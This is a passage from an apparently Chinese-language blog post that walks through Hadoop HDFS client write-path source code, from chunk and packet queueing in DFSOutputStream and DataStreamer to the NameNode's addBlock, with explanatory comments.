class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i += sum.getBytesPerChecksum()) &#123;</span><br><span class="line">      <span class="keyword">int</span> chunkLen = Math.min(sum.getBytesPerChecksum(), len - i);</span><br><span class="line">      <span class="keyword">int</span> ckOffset = i / sum.getBytesPerChecksum() * getChecksumSize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个chunk一个chunk的将数据写入队列</span></span><br><span class="line">      writeChunk(b, off + i, chunkLen, checksum, ckOffset,</span><br><span class="line">          getChecksumSize());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">      scope.close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">writeChunk</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> bOffset, <span class="keyword">int</span> bLen,</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">byte</span>[] checksum, <span class="keyword">int</span> checksumOffset, <span class="keyword">int</span> checksumLen)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同理查找实现类DFSOutputStream</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writeChunk</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> offset, <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">byte</span>[] checksum, <span class="keyword">int</span> ckoff, <span class="keyword">int</span> cklen)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  writeChunkPrepare(len, ckoff, cklen);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 往packet里面写chunk的校验和 4byte</span></span><br><span class="line">  currentPacket.writeChecksum(checksum, ckoff, cklen);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 往packet里面写一个chunk 512 byte</span></span><br><span class="line">  currentPacket.writeData(b, offset, len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 记录写入packet中的chunk个数，累计到127个chuck，这个packet就满了</span></span><br><span class="line">  currentPacket.incNumChunks();</span><br><span class="line">  getStreamer().incBytesCurBlock(len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If packet is full, enqueue it for transmission</span></span><br><span class="line">  <span class="keyword">if</span> (currentPacket.getNumChunks() == currentPacket.getMaxChunks() ||</span><br><span class="line">      getStreamer().getBytesCurBlock() == blockSize) &#123;</span><br><span class="line">    enqueueCurrentPacketFull();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">enqueueCurrentPacketFull</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  LOG.debug(<span class="string">"enqueue full &#123;&#125;, src=&#123;&#125;, bytesCurBlock=&#123;&#125;, blockSize=&#123;&#125;,"</span></span><br><span class="line">          + <span class="string">" appendChunk=&#123;&#125;, &#123;&#125;"</span>, currentPacket, src, getStreamer()</span><br><span class="line">          .getBytesCurBlock(), blockSize, getStreamer().getAppendChunk(),</span><br><span class="line">      getStreamer());</span><br><span class="line"></span><br><span class="line">  enqueueCurrentPacket();</span><br><span class="line"></span><br><span class="line">  adjustChunkBoundary();</span><br><span class="line"></span><br><span class="line">  endBlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueueCurrentPacket</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  getStreamer().waitAndQueuePacket(currentPacket);</span><br><span class="line">  currentPacket = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitAndQueuePacket</span><span class="params">(DFSPacket packet)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 如果队列满了，等待</span></span><br><span class="line">      <span class="comment">// If queue is full, then wait till we have enough space</span></span><br><span class="line">      <span class="keyword">boolean</span> firstWait = <span class="keyword">true</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (!streamerClosed &amp;&amp; dataQueue.size() + ackQueue.size() &gt;</span><br><span class="line">            dfsClient.getConf().getWriteMaxPackets()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (firstWait) &#123;</span><br><span class="line">            Span span = Tracer.getCurrentSpan();</span><br><span class="line">            <span class="keyword">if</span> (span != <span class="keyword">null</span>) &#123;</span><br><span class="line">              span.addTimelineAnnotation(<span class="string">"dataQueue.wait"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            firstWait = <span class="keyword">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            dataQueue.wait();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            ... ...</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Span span = Tracer.getCurrentSpan();</span><br><span class="line">        <span class="keyword">if</span> ((span != <span class="keyword">null</span>) &amp;&amp; (!firstWait)) &#123;</span><br><span class="line">          span.addTimelineAnnotation(<span class="string">"end.wait"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      checkClosed();</span><br><span class="line">    <span class="comment">// 如果队列没满，向队列中添加数据</span></span><br><span class="line">      queuePacket(packet);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClosedChannelException ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DataStreamer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queuePacket</span><span class="params">(DFSPacket packet)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">    <span class="keyword">if</span> (packet == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    packet.addTraceParent(Tracer.getCurrentSpanId());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向队列中添加数据</span></span><br><span class="line">    dataQueue.addLast(packet);</span><br><span class="line"></span><br><span class="line">    lastQueuedSeqno = packet.getSeqno();</span><br><span class="line">    LOG.debug(<span class="string">"Queued &#123;&#125;, &#123;&#125;"</span>, packet, <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 通知队列添加数据完成</span></span><br><span class="line">    dataQueue.notifyAll();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-建立管道之机架感知（块存储位置）">3.2 建立管道之机架感知（块存储位置）</h3><p>全局查找DataStreamer，搜索run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> lastPacket = Time.monotonicNow();</span><br><span class="line">  TraceScope scope = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (!streamerClosed &amp;&amp; dfsClient.clientRunning) &#123;</span><br><span class="line">    <span class="comment">// if the Responder encountered an error, shutdown Responder</span></span><br><span class="line">    <span class="keyword">if</span> (errorState.hasError()) &#123;</span><br><span class="line">    closeResponder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DFSPacket one;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// process datanode IO errors if any</span></span><br><span class="line">    <span class="keyword">boolean</span> doSleep = processDatanodeOrExternalError();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> halfSocketTimeout = dfsClient.getConf().getSocketTimeout()/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line">      <span class="comment">// wait for a packet to be sent.</span></span><br><span class="line">      <span class="keyword">long</span> now = Time.monotonicNow();</span><br><span class="line">      <span class="keyword">while</span> ((!shouldStop() &amp;&amp; dataQueue.size() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (stage != BlockConstructionStage.DATA_STREAMING ||</span><br><span class="line">          now - lastPacket &lt; halfSocketTimeout)) || doSleep) &#123;</span><br><span class="line">      <span class="keyword">long</span> timeout = halfSocketTimeout - (now-lastPacket);</span><br><span class="line">      timeout = timeout &lt;= <span class="number">0</span> ? <span class="number">1000</span> : timeout;</span><br><span class="line">      timeout = (stage == BlockConstructionStage.DATA_STREAMING)?</span><br><span class="line">        timeout : <span class="number">1000</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果dataQueue里面没有数据，代码会阻塞在这儿</span></span><br><span class="line">        dataQueue.wait(timeout); <span class="comment">// 接收到notify消息</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException  e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">      doSleep = <span class="keyword">false</span>;</span><br><span class="line">      now = Time.monotonicNow();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (shouldStop()) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// get packet to be sent.</span></span><br><span class="line">      <span class="keyword">if</span> (dataQueue.isEmpty()) &#123;</span><br><span class="line">      one = createHeartbeatPacket();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        backOffIfNecessary();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Caught exception"</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//  队列不为空，从队列中取出packet</span></span><br><span class="line">      one = dataQueue.getFirst(); <span class="comment">// regular data packet</span></span><br><span class="line">      SpanId[] parents = one.getTraceParents();</span><br><span class="line">      <span class="keyword">if</span> (parents.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        scope = dfsClient.getTracer().</span><br><span class="line">          newScope(<span class="string">"dataStreamer"</span>, parents[<span class="number">0</span>]);</span><br><span class="line">        scope.getSpan().setParents(parents);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get new block from namenode.</span></span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">      LOG.debug(<span class="string">"stage="</span> + stage + <span class="string">", "</span> + <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stage == BlockConstructionStage.PIPELINE_SETUP_CREATE) &#123;</span><br><span class="line">      LOG.debug(<span class="string">"Allocating new block: &#123;&#125;"</span>, <span class="keyword">this</span>);</span><br><span class="line">      <span class="comment">// 步骤一：向NameNode 申请block 并建立数据管道</span></span><br><span class="line">      setPipeline(nextBlockOutputStream());</span><br><span class="line">      <span class="comment">// 步骤二：启动ResponseProcessor用来监听packet发送是否成功</span></span><br><span class="line">      initDataStreaming();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stage == BlockConstructionStage.PIPELINE_SETUP_APPEND) &#123;</span><br><span class="line">      setupPipelineForAppendOrRecovery();</span><br><span class="line">      <span class="keyword">if</span> (streamerClosed) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      initDataStreaming();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> lastByteOffsetInBlock = one.getLastByteOffsetBlock();</span><br><span class="line">    <span class="keyword">if</span> (lastByteOffsetInBlock &gt; stat.getBlockSize()) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"BlockSize "</span> + stat.getBlockSize() +</span><br><span class="line">        <span class="string">" &lt; lastByteOffsetInBlock, "</span> + <span class="keyword">this</span> + <span class="string">", "</span> + one);</span><br><span class="line">    &#125;</span><br><span class="line">    … …</span><br><span class="line">    <span class="comment">// send the packet</span></span><br><span class="line">    SpanId spanId = SpanId.INVALID;</span><br><span class="line">    <span class="keyword">synchronized</span> (dataQueue) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// move packet from dataQueue to ackQueue</span></span><br><span class="line">      <span class="keyword">if</span> (!one.isHeartbeatPacket()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">        spanId = scope.getSpanId();</span><br><span class="line">        scope.detach();</span><br><span class="line"></span><br><span class="line">        one.setTraceScope(scope);</span><br><span class="line">      &#125;</span><br><span class="line">      scope = <span class="keyword">null</span>;</span><br><span class="line">      <span class="comment">// 步骤三：从dataQueue 把要发送的这个packet 移除出去</span></span><br><span class="line">      dataQueue.removeFirst();</span><br><span class="line">      <span class="comment">// 步骤四：然后往ackQueue 里面添加这个packet</span></span><br><span class="line">      ackQueue.addLast(one);</span><br><span class="line">      packetSendTime.put(one.getSeqno(), Time.monotonicNow());</span><br><span class="line">      dataQueue.notifyAll();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOG.debug(<span class="string">"&#123;&#125; sending &#123;&#125;"</span>, <span class="keyword">this</span>, one);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write out data to remote datanode</span></span><br><span class="line">    <span class="keyword">try</span> (TraceScope ignored = dfsClient.getTracer().</span><br><span class="line">      newScope(<span class="string">"DataStreamer#writeTo"</span>, spanId)) &#123;</span><br><span class="line">      <span class="comment">//  将数据写出去</span></span><br><span class="line">      one.writeTo(blockStream);</span><br><span class="line">      blockStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      errorState.markFirstNodeIfNotMarked();</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    … …</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//点击nextBlockOutputStream</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> LocatedBlock <span class="title">nextBlockOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  LocatedBlock lb;</span><br><span class="line">  DatanodeInfo[] nodes;</span><br><span class="line">  StorageType[] nextStorageTypes;</span><br><span class="line">  String[] nextStorageIDs;</span><br><span class="line">  <span class="keyword">int</span> count = dfsClient.getConf().getNumBlockWriteRetry();</span><br><span class="line">  <span class="keyword">boolean</span> success;</span><br><span class="line">  <span class="keyword">final</span> ExtendedBlock oldBlock = block.getCurrentBlock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    errorState.resetInternalError();</span><br><span class="line">    lastException.clear();</span><br><span class="line"></span><br><span class="line">    DatanodeInfo[] excluded = getExcludedNodes();</span><br><span class="line">  <span class="comment">// 向NN获取向哪个DN写数据</span></span><br><span class="line">    lb = locateFollowingBlock(</span><br><span class="line">        excluded.length &gt; <span class="number">0</span> ? excluded : <span class="keyword">null</span>, oldBlock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建管道</span></span><br><span class="line">    success = createBlockOutputStream(nodes, nextStorageTypes, nextStorageIDs,</span><br><span class="line">          <span class="number">0L</span>, <span class="keyword">false</span>);</span><br><span class="line">    ......</span><br><span class="line">  &#125; <span class="keyword">while</span> (!success &amp;&amp; --count &gt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unable to create new block."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> lb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> LocatedBlock <span class="title">locateFollowingBlock</span><span class="params">(DatanodeInfo[] excluded,</span></span></span><br><span class="line"><span class="function"><span class="params">    ExtendedBlock oldBlock)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> DFSOutputStream.addBlock(excluded, dfsClient, src, oldBlock,</span><br><span class="line">      stat.getFileId(), favoredNodes, addBlockFlags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> LocatedBlock <span class="title">addBlock</span><span class="params">(DatanodeInfo[] excludedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">      DFSClient dfsClient, String src, ExtendedBlock prevBlock, <span class="keyword">long</span> fileId,</span></span></span><br><span class="line"><span class="function"><span class="params">      String[] favoredNodes, EnumSet&lt;AddBlockFlag&gt; allocFlags)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="comment">// 向NN获取向哪个DN写数据</span></span><br><span class="line">    <span class="keyword">return</span> dfsClient.namenode.addBlock(src, dfsClient.clientName, prevBlock,</span><br><span class="line">            excludedNodes, fileId, favoredNodes, allocFlags);</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LocatedBlock <span class="title">addBlock</span><span class="params">(String src, String clientName,</span></span></span><br><span class="line"><span class="function"><span class="params">      ExtendedBlock previous, DatanodeInfo[] excludeNodes, <span class="keyword">long</span> fileId,</span></span></span><br><span class="line"><span class="function"><span class="params">      String[] favoredNodes, EnumSet&lt;AddBlockFlag&gt; addBlockFlags)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure><p>回到namenode，点击NameNodeRpcServer，在该类中搜索addBlock</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> LocatedBlock <span class="title">addBlock</span><span class="params">(String src, String clientName,</span></span></span><br><span class="line"><span class="function"><span class="params">    ExtendedBlock previous, DatanodeInfo[] excludedNodes, <span class="keyword">long</span> fileId,</span></span></span><br><span class="line"><span class="function"><span class="params">    String[] favoredNodes, EnumSet&lt;AddBlockFlag&gt; addBlockFlags)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  checkNNStartup();</span><br><span class="line">  LocatedBlock locatedBlock = namesystem.getAdditionalBlock(src, fileId,</span><br><span class="line">      clientName, previous, excludedNodes, favoredNodes, addBlockFlags);</span><br><span class="line">  <span class="keyword">if</span> (locatedBlock != <span class="keyword">null</span>) &#123;</span><br><span class="line">    metrics.incrAddBlockOps();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> locatedBlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LocatedBlock <span class="title">getAdditionalBlock</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    String src, <span class="keyword">long</span> fileId, String clientName, ExtendedBlock previous,</span></span></span><br><span class="line"><span class="function"><span class="params">    DatanodeInfo[] excludedNodes, String[] favoredNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">    EnumSet&lt;AddBlockFlag&gt; flags)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> String operationName = <span class="string">"getAdditionalBlock"</span>;</span><br><span class="line">  NameNode.stateChangeLog.debug(<span class="string">"BLOCK* getAdditionalBlock: &#123;&#125;  inodeId &#123;&#125;"</span> +</span><br><span class="line">      <span class="string">" for &#123;&#125;"</span>, src, fileId, clientName);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// 